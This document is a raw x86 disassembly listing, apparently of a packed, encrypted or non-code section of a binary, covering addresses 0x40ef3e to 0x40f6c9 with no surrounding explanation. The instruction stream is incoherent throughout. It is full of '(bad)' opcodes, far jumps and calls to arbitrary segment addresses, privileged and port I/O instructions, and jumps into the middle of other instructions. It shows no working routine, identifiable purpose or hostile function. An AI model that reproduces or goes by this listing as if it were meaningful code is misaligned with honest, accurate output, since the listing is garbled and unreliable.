  40ef3e:	add    BYTE PTR [ebx+eiz*4],0xf4
  40ef42:	xchg   ebp,eax
  40ef43:	jge    0x40eee4
  40ef45:	inc    ebp
  40ef46:	inc    edi
  40ef47:	ret    0x4fb4
  40ef4a:	jmp    0x6a3c:0x4d8a6e93
  40ef51:	retf   0xa399
  40ef54:	fnstenv [ebx]
  40ef56:	add    bl,bh
  40ef58:	dec    ebp
  40ef59:	bnd jo 0x40efa4
  40ef5c:	fidivr DWORD PTR [ecx-0x1c212e01]
  40ef62:	pushf  
  40ef63:	sahf   
  40ef64:	je     0x40ef9e
  40ef66:	mov    al,0x88
  40ef68:	push   ebp
  40ef69:	(bad)  
  40ef6a:	js     0x40efa8
  40ef6c:	sub    BYTE PTR [edx-0x63],bh
  40ef6f:	sbb    edx,ebp
  40ef71:	mov    ah,0x28
  40ef73:	neg    edi
  40ef75:	fmul   DWORD PTR [edi+0x5f]
  40ef78:	or     BYTE PTR [di+0x3c],0x8a
  40ef7d:	mov    BYTE PTR [edi-0x49],bl
  40ef80:	ja     0x40ef5f
  40ef82:	neg    bh
  40ef84:	lods   eax,DWORD PTR ds:[esi]
  40ef85:	aas    
  40ef86:	popf   
  40ef87:	or     edx,DWORD PTR [esi-0x10]
  40ef8a:	dec    edi
  40ef8b:	ror    BYTE PTR [esi],cl
  40ef8d:	ds lahf 
  40ef8f:	fcomi  st,st(5)
  40ef91:	into   
  40ef92:	inc    ebx
  40ef93:	jmp    0x3aa37866
  40ef98:	iretw  
  40ef9a:	retf   
  40ef9b:	adc    edx,0xb
  40ef9e:	push   ebp
  40ef9f:	repz leave 
  40efa1:	je     0x40ef67
  40efa3:	sbb    dh,BYTE PTR [ecx-0x7c92f4ac]
  40efa9:	pop    edi
  40efab:	ins    BYTE PTR es:[edi],dx
  40efac:	loop   0x40efa3
  40efae:	xchg   ebp,eax
  40efaf:	dec    edx
  40efb0:	scas   al,BYTE PTR es:[edi]
  40efb1:	or     al,0x3c
  40efb3:	jns    0x40f00b
  40efb5:	repz js 0x40efa2
  40efb8:	adc    eax,0x55a0812
  40efbd:	imul   ecx,DWORD PTR ds:0x88638902,0x88491a14
  40efc7:	rol    BYTE PTR [eax+esi*2],0x53
  40efcb:	mov    edx,0x369d97e9
  40efd0:	add    ah,BYTE PTR [edi*4+0x4a440597]
  40efd7:	ficom  DWORD PTR [esi]
  40efd9:	cmp    bh,BYTE PTR [ebx]
  40efdb:	xor    ah,BYTE PTR [ebx+eax*1+0x0]
  40efdf:	xchg   DWORD PTR [edx+0x476761cf],esp
  40efe5:	xor    al,0x5b
  40efe7:	ins    DWORD PTR es:[edi],dx
  40efe8:	inc    ebx
  40efe9:	pop    edx
  40efea:	pop    edi
  40efeb:	sbb    DWORD PTR ds:0x456fcb89,esp
  40eff1:	xor    ecx,DWORD PTR [esi]
  40eff3:	sub    DWORD PTR [edx],0x4
  40eff6:	push   ebx
  40eff7:	inc    esp
  40eff8:	popf   
  40eff9:	test   eax,0xc35f6d29
  40effe:	push   0x45b35547
  40f003:	jge    0x40efe0
  40f005:	sbb    DWORD PTR [ecx],esp
  40f007:	mov    eax,0x340c5aeb
  40f00c:	or     esp,DWORD PTR [ebp+0x26]
  40f00f:	mov    al,ds:0x2d1bcacf
  40f014:	add    dh,ah
  40f016:	add    edx,DWORD PTR [edx]
  40f018:	mov    ds,WORD PTR [edi-0x12d017bd]
  40f01e:	dec    edx
  40f01f:	mov    cl,0x14
  40f021:	mov    WORD PTR [ebp-0xa503c29],cs
  40f027:	repnz xchg ecx,eax
  40f029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02a:	pop    edx
  40f02b:	jno    0x40f001
  40f02d:	call   0xac9a8289
  40f032:	fild   WORD PTR [esi+0x42]
  40f035:	dec    eax
  40f036:	loope  0x40f003
  40f038:	aad    0x65
  40f03a:	bound  ecx,QWORD PTR [edx]
  40f03c:	dec    edx
  40f03d:	stc    
  40f03e:	in     al,0x3f
  40f040:	pusha  
  40f041:	call   0x98cb:0x452afcef
  40f048:	ror    DWORD PTR [esp+esi*8-0x39],0x4e
  40f04d:	stc    
  40f04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f04f:	inc    esi
  40f050:	fld    TBYTE PTR [ebx]
  40f052:	test   eax,ebp
  40f054:	xchg   esi,eax
  40f055:	cmp    cl,BYTE PTR [edx]
  40f057:	adc    DWORD PTR [edx+eiz*2+0x22d0b72f],ecx
  40f05e:	or     eax,0x43f6eee4
  40f063:	imul   ebp,DWORD PTR [esi],0xc61465a6
  40f069:	or     al,0x3c
  40f06b:	pop    DWORD PTR [edx-0x18203a3c]
  40f071:	mov    gs,WORD PTR [edi-0x48f75307]
  40f077:	neg    DWORD PTR [edx]
  40f079:	mov    edx,0xd7768b7
  40f07e:	mov    WORD PTR [edi],ss
  40f080:	jmp    0x9fe0:0xb196bc01
  40f087:	mov    BYTE PTR [ebx+0x157fb267],dl
  40f08d:	test   eax,0x6518e9c2
  40f092:	ror    BYTE PTR [ecx],1
  40f094:	mov    edx,0xe75c2a42
  40f099:	mov    edx,0xb9cd72c4
  40f09e:	jge    0x40f029
  40f0a0:	test   BYTE PTR [edi],cl
  40f0a2:	sub    DWORD PTR ds:0x59696c48,esi
  40f0a8:	shr    DWORD PTR [ebx],1
  40f0aa:	stos   DWORD PTR es:[edi],eax
  40f0ab:	iret   
  40f0ac:	sub    dl,BYTE PTR [edi+0x13a6ef3]
  40f0b2:	add    eax,0xc1548f9a
  40f0b7:	imul   eax,DWORD PTR [edx-0x48],0xfffffffa
  40f0bb:	in     eax,dx
  40f0bc:	sub    BYTE PTR [eax-0x7752f235],cl
  40f0c2:	mov    ch,0x80
  40f0c4:	call   0xc3c6:0xa9959935
  40f0cb:	popf   
  40f0cc:	push   edi
  40f0cd:	pop    esi
  40f0ce:	shr    DWORD PTR [eax+esi*8],cl
  40f0d1:	in     al,0x8f
  40f0d3:	int3   
  40f0d4:	mov    dh,ch
  40f0d6:	push   eax
  40f0d7:	mov    eax,0x8e63839c
  40f0dc:	lahf   
  40f0dd:	int    0xcc
  40f0df:	ja     0x40f111
  40f0e1:	shr    ah,0xa
  40f0e4:	mov    edi,0xe7f2d656
  40f0e9:	jbe    0x40f145
  40f0eb:	dec    edx
  40f0ec:	and    edx,DWORD PTR [ecx]
  40f0ee:	cmp    al,0xe0
  40f0f0:	xchg   DWORD PTR [ecx-0x53],ecx
  40f0f3:	scas   eax,DWORD PTR es:[edi]
  40f0f4:	jge    0x40f16d
  40f0f6:	ret    
  40f0f7:	movups XMMWORD PTR [ecx+eax*1-0x64],xmm5
  40f0fc:	cmp    bl,BYTE PTR [eax]
  40f0fe:	mov    esp,0xe28fd825
  40f103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f105:	fisub  WORD PTR [ebx+0x3af6e502]
  40f10b:	ins    DWORD PTR es:[edi],dx
  40f10c:	lods   al,BYTE PTR ds:[esi]
  40f10d:	inc    esp
  40f10e:	pop    edx
  40f10f:	ins    BYTE PTR es:[edi],dx
  40f110:	ss int3 
  40f112:	inc    edi
  40f113:	daa    
  40f114:	and    ah,dh
  40f116:	ds clc 
  40f118:	xor    BYTE PTR [esi+0x27f7e987],bl
  40f11e:	pop    edi
  40f11f:	jbe    0x40f0b0
  40f121:	jg     0x40f0f1
  40f123:	fwait
  40f124:	mov    ah,0x1b
  40f126:	shl    BYTE PTR [ecx-0x37],cl
  40f129:	enter  0xf8fb,0x5f
  40f12d:	mov    esi,0x96832503
  40f132:	bswap  esi
  40f134:	add    eax,0xab550c17
  40f139:	shl    DWORD PTR [ecx],cl
  40f13b:	fmul   st,st(6)
  40f13d:	test   al,0xa7
  40f13f:	repz imul edx,DWORD PTR [ebx+0x37],0x2e
  40f144:	sbb    ebp,eax
  40f146:	jns    0x40f0eb
  40f148:	mov    ebp,0xcd5ad51e
  40f14d:	in     al,dx
  40f14e:	xor    al,0x84
  40f150:	imul   ebx,ecx,0xc988a63e
  40f156:	cmp    BYTE PTR [ebx+0x29],ah
  40f159:	xor    bl,BYTE PTR [ebx]
  40f15b:	xchg   DWORD PTR [ebp+0x38fd8540],eax
  40f161:	inc    BYTE PTR [edx-0x80]
  40f164:	adc    eax,0xdf87033a
  40f169:	neg    BYTE PTR [ebp-0x42]
  40f16c:	lock in al,dx
  40f16e:	mov    esi,0xb73c1a2e
  40f173:	cmc    
  40f174:	push   ds
  40f175:	pop    esp
  40f176:	in     al,0x28
  40f178:	imul   edi,DWORD PTR [eax],0x138d537d
  40f17e:	xchg   DWORD PTR [ecx-0x66],edx
  40f181:	test   DWORD PTR [esi+0x26],0x867606a9
  40f188:	sub    eax,0xb9e15043
  40f18d:	or     al,0x44
  40f18f:	jp     0x40f195
  40f191:	rcl    BYTE PTR [edi-0x80],0xb7
  40f195:	push   0x9eefe498
  40f19a:	int3   
  40f19b:	mov    al,ds:0xaa592d7f
  40f1a0:	adc    eax,0xbae1dd55
  40f1a5:	sub    al,0x28
  40f1a7:	ins    BYTE PTR es:[edi],dx
  40f1a8:	jno    0x40f147
  40f1aa:	(bad)  
  40f1ab:	aam    0xb6
  40f1ad:	icebp  
  40f1ae:	loope  0x40f16d
  40f1b0:	int3   
  40f1b1:	repz jb 0x40f1f7
  40f1b4:	lods   al,BYTE PTR ds:[esi]
  40f1b5:	dec    ebp
  40f1b6:	cld    
  40f1b7:	pop    DWORD PTR [eax]
  40f1b9:	mov    ah,0xb7
  40f1bb:	inc    edx
  40f1bc:	pop    ss
  40f1bd:	xor    eax,0x88ae7a2f
  40f1c2:	add    eax,0x5650e78b
  40f1c7:	mov    ah,0x41
  40f1c9:	cmp    BYTE PTR es:[ecx-0x4e],bh
  40f1cd:	neg    DWORD PTR [edi-0x4d8fbb87]
  40f1d3:	sub    esi,ecx
  40f1d5:	sub    BYTE PTR [eax],bh
  40f1d7:	xchg   edi,eax
  40f1d8:	je     0x40f1f7
  40f1da:	push   ss
  40f1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1dc:	mov    edx,0xb12da910
  40f1e1:	js     0x40f1b6
  40f1e3:	clc    
  40f1e4:	leave  
  40f1e5:	mov    dh,0xbf
  40f1e7:	adc    bh,BYTE PTR [ebx+ebx*4+0x629c182e]
  40f1ee:	in     eax,dx
  40f1ef:	and    BYTE PTR [eax+0x1d],al
  40f1f2:	pop    esi
  40f1f3:	loop   0x40f1a6
  40f1f5:	sub    BYTE PTR [ebx-0x43],cl
  40f1f8:	retf   0x43a4
  40f1fb:	icebp  
  40f1fc:	cmp    al,0xe5
  40f1fe:	shl    cl,1
  40f200:	dec    ebp
  40f201:	mov    bh,0x79
  40f203:	pop    ebx
  40f204:	cmp    ebp,DWORD PTR ds:0x5ccdd113
  40f20a:	cmp    al,0x85
  40f20c:	call   0xb63:0x68f65a92
  40f213:	cdq    
  40f214:	mov    ebp,0xc9ea444c
  40f219:	xchg   edi,eax
  40f21a:	aaa    
  40f21b:	xchg   esp,eax
  40f21c:	mov    ebx,DWORD PTR [edi+0x59]
  40f21f:	mov    esi,0xf18aba4e
  40f224:	popa   
  40f225:	mov    eax,0x9cae85fb
  40f22a:	sub    al,bh
  40f22c:	mov    edx,0xe10344d5
  40f231:	(bad)  
  40f232:	push   edx
  40f233:	fsubr  QWORD PTR [esi+ebp*1]
  40f236:	ret    0xac06
  40f239:	mov    fs,ebx
  40f23b:	popf   
  40f23c:	xor    BYTE PTR [edx],cl
  40f23e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f23f:	mov    BYTE PTR [edi-0x5cd4646a],0x9f
  40f246:	cli    
  40f247:	pop    es
  40f248:	sar    BYTE PTR [edx+0x5c],0xcf
  40f24c:	xchg   edx,eax
  40f24d:	pop    eax
  40f24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f24f:	scas   al,BYTE PTR es:[edi]
  40f250:	js     0x40f212
  40f252:	fisub  WORD PTR [ecx+eax*2-0x2d]
  40f256:	cmp    al,0xf0
  40f258:	add    DWORD PTR [edi+0x30],ecx
  40f25b:	push   ecx
  40f25c:	mov    cl,0x26
  40f25e:	and    ebx,DWORD PTR [edx-0x7a436103]
  40f264:	jp     0x40f232
  40f266:	cmc    
  40f267:	sub    BYTE PTR [edx+0x2],bh
  40f26a:	xchg   DWORD PTR [esi],ecx
  40f26c:	pop    ss
  40f26d:	aam    0x42
  40f26f:	mov    ch,0x85
  40f271:	push   ecx
  40f272:	aas    
  40f273:	inc    eax
  40f274:	jae    0x40f2ea
  40f276:	push   cs
  40f277:	mov    ebp,0x2a8b7047
  40f27c:	out    dx,eax
  40f27d:	or     esp,ebx
  40f27f:	ss hlt 
  40f281:	add    edx,0x1618df73
  40f287:	xor    DWORD PTR ds:[eax],eax
  40f28a:	dec    ebx
  40f28b:	nop
  40f28c:	xchg   esp,eax
  40f28d:	jbe    0x40f272
  40f28f:	popf   
  40f290:	mov    ebx,0xc83652c6
  40f295:	in     al,0xd
  40f297:	xchg   ebx,eax
  40f298:	adc    al,0x7d
  40f29a:	sbb    BYTE PTR [ebp+0x37],al
  40f29d:	lds    ebp,FWORD PTR [edi-0x60f10c18]
  40f2a3:	call   0xb965:0x34fc4c77
  40f2aa:	imul   edx,DWORD PTR [ecx-0x57],0x817b3fce
  40f2b1:	and    al,0xb1
  40f2b3:	(bad)  
  40f2b4:	cmc    
  40f2b5:	daa    
  40f2b6:	icebp  
  40f2b7:	cmp    dh,BYTE PTR [ebx-0x7b]
  40f2ba:	popf   
  40f2bb:	jbe    0x40f291
  40f2bd:	sub    BYTE PTR [esp+ecx*4-0x3d],dh
  40f2c1:	leave  
  40f2c2:	leave  
  40f2c3:	adc    eax,0x92f4836c
  40f2c8:	adc    al,0x89
  40f2ca:	(bad)  
  40f2cb:	adc    cl,BYTE PTR [ecx-0x48]
  40f2ce:	sub    al,0x3c
  40f2d0:	ret    0x614e
  40f2d3:	mov    eax,0x99d70505
  40f2d8:	imul   esi,DWORD PTR [esi+0x46],0xffffffec
  40f2dc:	add    al,0x50
  40f2de:	(bad)  
  40f2df:	fild   WORD PTR [ebx-0x2]
  40f2e2:	adc    bh,BYTE PTR [ecx+0x7f]
  40f2e5:	mov    ds:0xe53321db,al
  40f2ea:	pop    edi
  40f2eb:	mov    eax,0xc08ac3a5
  40f2f0:	jle    0x40f2f5
  40f2f2:	dec    esi
  40f2f3:	or     DWORD PTR [ebx-0x58],eax
  40f2f6:	push   edi
  40f2f7:	fwait
  40f2f8:	cdq    
  40f2f9:	nop
  40f2fa:	shl    BYTE PTR [ecx],1
  40f2fc:	pop    DWORD PTR [eax-0x53]
  40f2ff:	leave  
  40f300:	retf   
  40f301:	dec    ah
  40f303:	fnstsw WORD PTR [ecx+0x53]
  40f306:	imul   esi,DWORD PTR [ecx],0x31eb5ad
  40f30c:	(bad)  
  40f30e:	xor    edx,esi
  40f310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f311:	pop    eax
  40f312:	ins    BYTE PTR es:[edi],dx
  40f313:	or     al,0xd1
  40f315:	neg    BYTE PTR [edx-0x41]
  40f318:	and    eax,0xdab33983
  40f31d:	mov    fs,edi
  40f31f:	jne    0x40f35e
  40f321:	stc    
  40f322:	and    esi,DWORD PTR [ebx+0x261109fc]
  40f328:	add    BYTE PTR [ebx-0x28371339],ch
  40f32e:	push   esp
  40f32f:	add    bl,dh
  40f331:	retf   0xc001
  40f334:	sahf   
  40f335:	pop    edi
  40f336:	cmp    al,0xa8
  40f338:	pop    ss
  40f339:	fdivr  st,st(0)
  40f33b:	icebp  
  40f33c:	xchg   ebx,eax
  40f33d:	or     eax,0x2e9ff709
  40f342:	dec    DWORD PTR [ecx-0x4f]
  40f345:	xchg   ebp,eax
  40f346:	test   DWORD PTR [ecx],esi
  40f348:	sbb    ecx,0x99a234f3
  40f34e:	ja     0x40f337
  40f350:	scas   al,BYTE PTR es:[edi]
  40f351:	xlat   BYTE PTR ds:[ebx]
  40f352:	repz mov dl,0x12
  40f355:	div    DWORD PTR [esi+0xcfaf0a9]
  40f35b:	sbb    al,0xa5
  40f35d:	in     al,dx
  40f35e:	xchg   edi,eax
  40f35f:	jbe    0x40f303
  40f361:	xor    ch,ah
  40f363:	cs iret 
  40f365:	adc    dh,BYTE PTR [edx]
  40f367:	sbb    DWORD PTR [ebx],ebx
  40f369:	repz push edi
  40f36b:	call   FWORD PTR [ebx+0x2ea5bd15]
  40f371:	in     eax,dx
  40f372:	mov    dl,0x9c
  40f374:	(bad)  
  40f375:	mov    ds:0xc276cc4a,al
  40f37a:	jge    0x40f365
  40f37c:	jns    0x40f3bd
  40f37e:	push   cs
  40f37f:	pop    esi
  40f380:	inc    ebp
  40f381:	fnstenv [edx+0x7b98ff90]
  40f387:	lods   al,BYTE PTR ds:[esi]
  40f388:	xchg   ebx,eax
  40f389:	xchg   ebp,eax
  40f38a:	xor    al,0x1f
  40f38c:	adc    BYTE PTR [ebx-0x710ee7f2],bh
  40f392:	jne    0x40f405
  40f394:	pushf  
  40f395:	ins    DWORD PTR es:[edi],dx
  40f396:	sbb    cl,BYTE PTR [ebx]
  40f398:	xor    esp,ecx
  40f39a:	cmp    DWORD PTR ss:[edx],eax
  40f39d:	es loopne 0x40f383
  40f3a0:	imul   esi,DWORD PTR [edx+0x4f],0x6e35c905
  40f3a7:	push   esp
  40f3a8:	cmp    BYTE PTR [edx-0x6a],al
  40f3ab:	dec    esi
  40f3ac:	in     al,0xa3
  40f3ae:	pop    esi
  40f3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3b0:	cmp    DWORD PTR [eax],ebp
  40f3b2:	aaa    
  40f3b3:	push   0x31
  40f3b5:	fwait
  40f3b6:	jne    0x40f416
  40f3b8:	loope  0x40f347
  40f3ba:	stos   BYTE PTR es:[edi],al
  40f3bb:	fisttp QWORD PTR [ecx+0x53b042d6]
  40f3c1:	std    
  40f3c2:	in     al,0xfa
  40f3c4:	sbb    al,0x96
  40f3c6:	mov    ds:0x32045292,al
  40f3cb:	out    0x72,al
  40f3cd:	sub    bh,BYTE PTR [ecx+0x38]
  40f3d0:	arpl   WORD PTR [esi+0x15e299ad],bp
  40f3d6:	pop    eax
  40f3d7:	addr16 push ebp
  40f3d9:	enter  0x1269,0x82
  40f3dd:	ja     0x40f370
  40f3df:	sbb    eax,0xb3103170
  40f3e4:	leave  
  40f3e5:	fs mov edx,0x879a6089
  40f3eb:	jle    0x40f3df
  40f3ed:	std    
  40f3ee:	mov    cl,0x27
  40f3f0:	fldl2t 
  40f3f2:	imul   esp,DWORD PTR [ebp+0x43bdd967],0x1e
  40f3f9:	or     edi,ebp
  40f3fb:	js     0x40f38a
  40f3fd:	je     0x40f46a
  40f3ff:	dec    esi
  40f400:	jmp    0x8cf7:0x5d1c3cae
  40f407:	aad    0x4c
  40f409:	adc    al,0xe
  40f40b:	adc    dl,0xc1
  40f40e:	xchg   ecx,eax
  40f40f:	pop    ebp
  40f410:	iret   
  40f411:	mov    ch,BYTE PTR [ecx+0x29430bc3]
  40f417:	push   es
  40f418:	sub    esp,DWORD PTR [eax]
  40f41a:	xchg   edx,eax
  40f41b:	retf   
  40f41c:	cdq    
  40f41d:	xor    DWORD PTR [eax+0x1],edx
  40f420:	inc    esp
  40f421:	rol    DWORD PTR [eax],cl
  40f423:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f425:	cmp    DWORD PTR [ecx+0x3b],ebx
  40f428:	cmp    BYTE PTR [ecx+0x6c],ah
  40f42b:	jns    0x40f4a4
  40f42d:	xchg   esp,eax
  40f42e:	adc    BYTE PTR [esi+0x7f77c2e5],0xca
  40f435:	pusha  
  40f436:	push   0x8ac1b905
  40f43b:	jmp    0xf1131246
  40f440:	sub    eax,0x62128a2c
  40f445:	call   0xa6f7799b
  40f44a:	mov    cl,0x69
  40f44c:	or     bh,BYTE PTR [ebx-0x5c]
  40f44f:	(bad)  
  40f451:	loope  0x40f40c
  40f453:	or     DWORD PTR [edi+0x3b29d8dd],ecx
  40f459:	or     DWORD PTR [esi-0x1c194e54],ecx
  40f45f:	test   eax,0x83dbf9ad
  40f464:	push   es
  40f465:	(bad)  
  40f467:	mov    cl,0x3f
  40f469:	lea    esi,[ecx]
  40f46b:	sbb    ebx,DWORD PTR [eax-0x58]
  40f46e:	sahf   
  40f46f:	(bad)  
  40f470:	clc    
  40f471:	fdiv   DWORD PTR [ebx+0x15]
  40f474:	(bad)  
  40f475:	jl     0x40f488
  40f477:	fsubr  QWORD PTR [eax+0x4a96df1f]
  40f47d:	or     eax,edi
  40f47f:	mov    edx,0x785525af
  40f484:	out    dx,al
  40f485:	push   esp
  40f486:	pop    ebp
  40f487:	lds    eax,FWORD PTR [ebp-0xb93acca]
  40f48d:	sbb    DWORD PTR [ebx+edx*8+0x3c2cae6d],esi
  40f494:	imul   ecx,DWORD PTR [edi-0x2d],0x6e
  40f498:	sub    al,0x8b
  40f49a:	test   cl,al
  40f49c:	ja     0x40f4f3
  40f49e:	push   esp
  40f49f:	mov    edi,0x414da36b
  40f4a4:	stos   BYTE PTR es:[edi],al
  40f4a5:	xor    al,0x9b
  40f4a7:	mov    ds:0x346b760e,eax
  40f4ac:	pop    edx
  40f4ad:	test   DWORD PTR [ecx+0x5d],edx
  40f4b0:	pop    eax
  40f4b1:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4b3:	test   eax,0x25ca54d1
  40f4b8:	jae    0x40f4d8
  40f4ba:	fdiv   QWORD PTR [ebx]
  40f4bc:	arpl   WORD PTR [edi-0x6e],ax
  40f4bf:	pop    esi
  40f4c0:	inc    esi
  40f4c1:	add    DWORD PTR [ebp-0x2606e521],esi
  40f4c7:	jecxz  0x40f4c0
  40f4c9:	xchg   ebx,eax
  40f4ca:	mov    ds:0xa4fa6283,al
  40f4cf:	pop    ecx
  40f4d0:	inc    edx
  40f4d1:	outs   dx,DWORD PTR ds:[esi]
  40f4d2:	(bad)  
  40f4d3:	pop    ebp
  40f4d4:	aam    0xf6
  40f4d6:	hlt    
  40f4d7:	scas   al,BYTE PTR es:[edi]
  40f4d8:	inc    BYTE PTR [eax+ebx*8]
  40f4db:	push   0xc
  40f4dd:	cdq    
  40f4de:	xor    DWORD PTR fs:[eax],0x6faaab15
  40f4e5:	popa   
  40f4e6:	in     eax,0x85
  40f4e8:	out    dx,eax
  40f4e9:	stos   BYTE PTR es:[edi],al
  40f4ea:	inc    esp
  40f4eb:	in     eax,dx
  40f4ec:	xchg   BYTE PTR [ecx],bh
  40f4ee:	loope  0x40f4b6
  40f4f0:	(bad)  
  40f4f1:	mov    dh,0xec
  40f4f3:	fsubr  st,st(2)
  40f4f5:	fmulp  st(6),st
  40f4f7:	pusha  
  40f4f8:	mov    ds:0xf9c7bba7,eax
  40f4fd:	push   es
  40f4fe:	pop    ecx
  40f4ff:	gs mov esp,0xdb9303b0
  40f505:	inc    ebp
  40f506:	jne    0x40f4f2
  40f508:	les    ebx,FWORD PTR [edi]
  40f50a:	push   ebp
  40f50b:	xor    DWORD PTR [esi+edi*8+0x12],0xffffff9e
  40f510:	retf   
  40f511:	cmp    eax,0x3ab7b6cf
  40f516:	jmp    0x83852151
  40f51b:	jne    0x40f557
  40f51d:	shr    BYTE PTR [edi+0x5a],cl
  40f520:	cld    
  40f521:	jbe    0x40f4aa
  40f523:	push   edi
  40f524:	sub    BYTE PTR [ebp+0x4b246620],0xa5
  40f52b:	popf   
  40f52c:	jns    0x40f4f9
  40f52e:	retf   0xbe8d
  40f531:	dec    ebp
  40f532:	adc    eax,ebp
  40f534:	push   ebx
  40f535:	call   0x7087109f
  40f53a:	fstp   st(7)
  40f53c:	dec    ecx
  40f53d:	adc    DWORD PTR [ebp-0x27],edx
  40f540:	jmp    0x40f52a
  40f542:	mov    ebx,0xef80a24f
  40f547:	(bad)  
  40f548:	sub    BYTE PTR [edi-0x22],bl
  40f54b:	out    0xd3,al
  40f54d:	test   ecx,0xd084b101
  40f553:	jb     0x40f5b4
  40f555:	mov    ch,0xaa
  40f557:	xlat   BYTE PTR ds:[ebx]
  40f558:	jbe    0x40f54b
  40f55a:	retf   
  40f55b:	xchg   BYTE PTR [ebx+0x5041b058],al
  40f561:	pushf  
  40f562:	mov    ah,0xab
  40f564:	mov    al,BYTE PTR [eax+0xa]
  40f567:	retf   0xb8f0
  40f56a:	xchg   esp,eax
  40f56b:	sbb    al,BYTE PTR [ebx]
  40f56d:	xchg   esi,eax
  40f56e:	sub    cl,BYTE PTR [eax-0x66908fde]
  40f574:	and    eax,0x2089daca
  40f579:	jns    0x40f550
  40f57b:	mov    ds:0xe6fb47e0,al
  40f580:	(bad)  
  40f581:	mov    eax,0xf92e2f08
  40f586:	mov    edx,ds
  40f588:	fmul   st,st(3)
  40f58a:	mov    esp,0x53377295
  40f58f:	mov    bh,0xf4
  40f591:	cmp    al,0x7f
  40f593:	adc    eax,0x7fc99af1
  40f598:	pop    es
  40f599:	sub    BYTE PTR [esi-0x711765f2],dh
  40f59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a0:	loop   0x40f5fd
  40f5a2:	add    BYTE PTR [edi-0x32],bh
  40f5a5:	add    BYTE PTR [edx+ebx*2+0x41e62a85],bl
  40f5ac:	out    0xda,eax
  40f5ae:	or     eax,0xd6e98f5
  40f5b3:	ins    DWORD PTR es:[edi],dx
  40f5b4:	sub    BYTE PTR [esi+0x241123a7],0xf0
  40f5bb:	and    dl,BYTE PTR [edi]
  40f5bd:	bnd jg 0x40f549
  40f5c0:	mov    BYTE PTR [edi],ah
  40f5c2:	or     esi,DWORD PTR [esi]
  40f5c4:	mov    ds:0x8ef6998b,eax
  40f5c9:	or     al,0xc5
  40f5cb:	inc    ecx
  40f5cc:	fwait
  40f5cd:	xor    esp,DWORD PTR [eax+0x1d99adaf]
  40f5d3:	(bad)  
  40f5d5:	xchg   edi,eax
  40f5d6:	sub    eax,DWORD PTR [eax]
  40f5d8:	pop    eax
  40f5d9:	mov    al,0x50
  40f5db:	cmp    ebx,DWORD PTR [eax-0x4f85f5af]
  40f5e1:	(bad)  
  40f5e2:	pop    ecx
  40f5e3:	inc    ebx
  40f5e4:	push   ebp
  40f5e5:	ins    DWORD PTR es:[edi],dx
  40f5e6:	xchg   BYTE PTR [edi],dl
  40f5e8:	daa    
  40f5e9:	push   cs
  40f5ea:	jp     0x40f5cf
  40f5ec:	jo     0x40f597
  40f5ee:	xor    al,0xea
  40f5f0:	rdpmc  
  40f5f2:	call   0xa71eea30
  40f5f7:	(bad)  
  40f5f8:	mov    edi,0x272b7266
  40f5fd:	xchg   ebp,eax
  40f5fe:	out    0x19,eax
  40f600:	xlat   BYTE PTR ds:[ebx]
  40f601:	popf   
  40f602:	test   al,0x6d
  40f604:	les    ecx,FWORD PTR [ebp+0x6]
  40f607:	add    eax,0x70073eb6
  40f60c:	add    bl,BYTE PTR [edi+0x5b]
  40f60f:	dec    esp
  40f610:	push   ebx
  40f611:	cmp    DWORD PTR [ecx+eax*4+0x439264be],ecx
  40f618:	sbb    eax,0x56a56d04
  40f61d:	jecxz  0x40f603
  40f61f:	and    bl,0xe6
  40f622:	xor    DWORD PTR [ebp-0x41d7fea7],edi
  40f628:	jp     0x40f691
  40f62a:	loop   0x40f5b0
  40f62c:	imul   esi,DWORD PTR [esi+0x37],0xf114df2c
  40f633:	shl    BYTE PTR [ebp+ebx*4+0x12],1
  40f637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f638:	jae    0x40f626
  40f63a:	scas   al,BYTE PTR es:[edi]
  40f63b:	or     DWORD PTR [ebp-0x31],0xffffff81
  40f63f:	cdq    
  40f640:	mov    esp,0xc99a6391
  40f645:	bound  edx,QWORD PTR [ebp+0x5cee09a]
  40f64b:	cld    
  40f64c:	sbb    esp,DWORD PTR [bp+di]
  40f64f:	adc    eax,edi
  40f651:	pop    ebp
  40f652:	test   bh,dl
  40f654:	mov    eax,0xa55133cb
  40f659:	pop    esi
  40f65a:	add    eax,0x3f33df6c
  40f65f:	push   0x46e415e8
  40f664:	inc    edi
  40f665:	pop    edx
  40f666:	dec    edx
  40f668:	xchg   esi,eax
  40f669:	mov    WORD PTR [edx+0x2ef39c9a],gs
  40f66f:	dec    ebp
  40f670:	sub    eax,0xda1160ba
  40f675:	test   cl,dl
  40f677:	mov    al,0x7b
  40f679:	sbb    ch,BYTE PTR [ecx]
  40f67b:	enter  0x780f,0xb4
  40f67f:	(bad)  
  40f680:	shrd   edi,esp,cl
  40f683:	fst    QWORD PTR [eax-0x53]
  40f686:	mov    al,ds:0x215697cd
  40f68b:	shl    DWORD PTR [esp+eax*2],1
  40f68e:	jb     0x40f645
  40f690:	xchg   al,al
  40f692:	inc    ecx
  40f693:	mov    esp,0xb6ded705
  40f698:	sub    DWORD PTR [edx+0x4a8311f8],edx
  40f69e:	mov    DWORD PTR [ecx],edx
  40f6a0:	xor    eax,0x6a19a418
  40f6a5:	adc    eax,0x2b0d6750
  40f6aa:	loope  0x40f6c3
  40f6ac:	adc    DWORD PTR [eax+esi*1-0x40],esi
  40f6b0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f6b2:	fsubp  st(0),st
  40f6b4:	rcl    DWORD PTR [ebx+0x51780af],1
  40f6ba:	das    
  40f6bb:	push   ebp
  40f6bc:	lds    eax,FWORD PTR [esi]
  40f6be:	mov    eax,ds:0xba372bc
  40f6c3:	inc    si
  40f6c5:	xchg   ecx,eax
  40f6c6:	mov    ah,0x4e
  40f6c8:	aas    
  40f6c9:	icebp  
